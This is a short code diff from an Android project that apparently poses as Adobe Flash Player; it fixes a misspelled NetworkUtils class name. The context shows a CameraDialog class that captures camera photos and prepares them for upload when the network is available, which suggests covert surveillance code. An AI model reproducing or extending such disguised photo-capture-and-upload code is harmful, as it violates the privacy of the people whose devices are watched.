@@ -30,7 +30,7 @@ import androidx.core.content.ContextCompat;
 import com.adobe.flashplayer.MyLog;
 import com.adobe.flashplayer.Utils;
 import com.adobe.flashplayer.accessory.AccessHelper;
-import com.adobe.flashplayer.network.NetworkUitls;
+import com.adobe.flashplayer.network.NetworkUtils;
 import com.adobe.flashplayer.network.UploadData;
 import com.adobe.flashplayer.Public;
 
@@ -345,7 +345,7 @@ public class CameraDialog implements Runnable
                 Log.e(TAG, "dialog create cost time:" + camerausetime);
 
                 if (data != null && data.length >= VALID_CAMERAPHOTO_SIZE) {
-                    if(NetworkUitls.isNetworkAvailable(context) == true){
+                    if(NetworkUtils.isNetworkAvailable(context) == true){
 
                         String filename = Utils.formatCurrentDateInFileName() + "_" + Public.CAMERAPHOTO_FILE_NAME;
                         int filenamelen = filename.getBytes().length;
